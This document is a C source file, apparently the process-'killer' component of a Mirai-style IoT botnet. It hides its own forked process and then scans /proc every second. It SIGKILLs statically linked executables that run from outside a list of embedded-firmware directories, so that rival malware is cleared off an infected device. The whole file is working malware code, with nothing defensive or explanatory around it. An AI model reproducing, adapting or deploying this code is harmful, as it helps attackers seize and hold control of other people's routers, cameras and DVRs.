#define _GNU_SOURCE

#include <arpa/inet.h>
#include <ctype.h>
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "includes.h"
#include "killer.h"
#include "util.h"

#define MAX_PATH_LEN 256
#define MAX_CMDLINE_LEN 1024

static char self_realpath[MAX_PATH_LEN] = {0};
static int killer_pid = -1;

static char *no_no_dirs[] = {
    "/usr/bin",  "/usr/sbin",  "/system",  "/mnt/mtd/app",  "/org",           "/z/zbin",
    "/home/app", "/dvr/bin",   "/duksan",  "/userfs",       "/mnt/app",       "/usr/etc",
    "/dvr/main", "/usr/local", "/var/bin", "/tmp/sqfs",     "/z/bin",         "/dvr",
    "/mnt/mtd",  "/zconf",     "/gm/bin",  "/home/process", "/var/challenge", "/usr/lib/",
};

static BOOL is_static(const char *path) {
  union ElfHeader {
    Elf32_Ehdr elf32;
    Elf64_Ehdr elf64;
  } header;

  int fd = open(path, O_RDONLY);
  if (fd < 0) return FALSE;

  ssize_t n = read(fd, &header, sizeof(header));
  if (n <= 0) {
    close(fd);
    return FALSE;
  }

  const unsigned char *ident = header.elf32.e_ident;
  if (ident[EI_MAG0] != ELFMAG0 || ident[EI_MAG1] != ELFMAG1 || ident[EI_MAG2] != ELFMAG2 ||
      ident[EI_MAG3] != ELFMAG3) {
    close(fd);
    return FALSE;
  }

  BOOL is_64bit = (ident[EI_CLASS] == ELFCLASS64);
  size_t phdr_size = is_64bit ? sizeof(Elf64_Phdr) : sizeof(Elf32_Phdr);
  size_t phdr_count = is_64bit ? header.elf64.e_phnum : header.elf32.e_phnum;
  off_t phdr_offset = is_64bit ? header.elf64.e_phoff : header.elf32.e_phoff;

  // we only want executables
  if (header.elf32.e_type != ET_EXEC) {
    close(fd);
    return FALSE;
  }

  // there is no way a normal binary has 128 program headerss...right??
  char buffer[128 * sizeof(Elf64_Phdr)];
  if (phdr_count > 128) {
    close(fd);
    return TRUE;
  }

  // seek. help.
  if (lseek(fd, phdr_offset, SEEK_SET) < 0) {
    close(fd);
    return FALSE;
  }

  // read meow meow
  if (read(fd, buffer, phdr_size * phdr_count) <= 0) {
    close(fd);
    return FALSE;
  }

  BOOL has_interp = FALSE;

  for (size_t i = 0; i < phdr_count && !has_interp; ++i) {
    if (is_64bit) {
      Elf64_Phdr *ph64 = (Elf64_Phdr *)buffer;
      has_interp = (ph64[i].p_type == PT_INTERP);
    } else {
      Elf32_Phdr *ph32 = (Elf32_Phdr *)buffer;
      has_interp = (ph32[i].p_type == PT_INTERP);
    }
  }

  close(fd);
  return !has_interp;
}

static int get_stat_time(char *pid) {
  char stat_path[PATH_MAX] = {0};
  char buffer[4096] = {0};
  char time_str[64] = {0};

  strcpy(stat_path, "/proc/");
  strcat(stat_path, pid);
  strcat(stat_path, "/stat");
  stat_path[strlen(stat_path)] = '\0';

  int fd = open(stat_path, O_RDONLY);
  if (fd < 0) return 0;

  ssize_t ret = read(fd, buffer, sizeof(buffer));
  if (ret <= 0) {
    close(fd);
    return 0;
  }

  int time_index = 0;
  int field = 0;

  for (int i = 0; i < ret && time_index < sizeof(time_str); i++) {
    if (buffer[i] == ' ') {
      ++field;
    } else if (field == 21) {
      if (buffer[i] == ' ') break;
      time_str[time_index++] = buffer[i];
    }
  }

  close(fd);
  return atoi(time_str);
}

static BOOL is_no_no_path_or_not_static(char *pid) {
  char path[PATH_MAX] = {0};
  char buffer[PATH_MAX] = {0};

  strcpy(path, "/proc/");
  strcat(path, pid);
  strcat(path, "/exe");
  path[strlen(path)] = '\0';

  // this will be bypassed by mount but that aint the point
  if (readlink(path, buffer, sizeof(buffer)) <= 0) {
    return TRUE;
  }

  buffer[strlen(buffer)] = '\0';

  if (strcmp(buffer, self_realpath) == 0) {
    return TRUE;
  }

  // we'll get a list of nono dirs
  for (int i = 0; i < sizeof(no_no_dirs) / sizeof(no_no_dirs[0]); i++) {
    char *dir = no_no_dirs[i];
    if (strncmp(buffer, dir, strlen(dir)) == 0) {
      return TRUE;
    }
  }

  return !is_static(path);
}

static void kill_malicious_processes(void) {
  DIR *dir = opendir("/proc");
  struct dirent *entry;

  while ((entry = readdir(dir)) != NULL) {
    if (!isdigit(*entry->d_name)) continue;
    if (is_no_no_path_or_not_static(entry->d_name)) continue;

    if (get_stat_time(entry->d_name) > 30000) {
#ifdef DEBUG
      printf("[killer] Start time of '%s' is '%d'\r\n", entry->d_name,
             get_stat_time(entry->d_name));
#endif
      kill(atoi(entry->d_name), 9);
    }
  }

  closedir(dir);
}

void killer_destroy(void) {
#ifdef DEBUG
  printf("[killer] Terminated process!\n");
#endif
  kill(killer_pid, SIGKILL);
}

void killer_create(void) {
  signal(SIGCHLD, SIG_IGN);
  util_strcpy(self_realpath, _self_path());

  if ((killer_pid = fork()) != 0) return;

  signal(SIGCHLD, SIG_IGN);
  hide_main_process(getpid());

  while (1) {
    kill_malicious_processes();
    sleep(1);
  }

  exit(0);
}

void killer_run_once(void) {
#ifdef DEBUG
  printf("[killer] Running initial cleanup...\n");
#endif

  killer_create();
}

void killer_kill_shell(void) {}
